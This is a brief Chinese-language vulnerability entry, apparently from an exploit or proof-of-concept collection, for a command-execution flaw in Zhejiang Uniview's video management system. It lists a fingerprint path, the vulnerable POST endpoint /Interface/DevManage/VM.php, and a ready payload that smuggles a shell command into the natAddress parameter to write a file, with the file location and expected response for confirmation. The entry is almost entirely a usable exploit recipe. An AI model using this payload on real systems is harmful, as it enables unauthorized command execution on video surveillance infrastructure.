# 浙江宇视视频管理系统VM.php存在命令执行漏洞

浙江宇视视频管理系统 ｜ 命令执行 ｜ —
- **指纹**：`/Script/Public/Language.js.php`
- **请求**：`POST /Interface/DevManage/VM.php HTTP/1.1`

**Payload**
```
cmd=setNatConfig&natAddress=%26echo%20DudeSuite%20>test.txt
文件定位：/Interface/DevManage/test.txt
```
- **响应特征**：200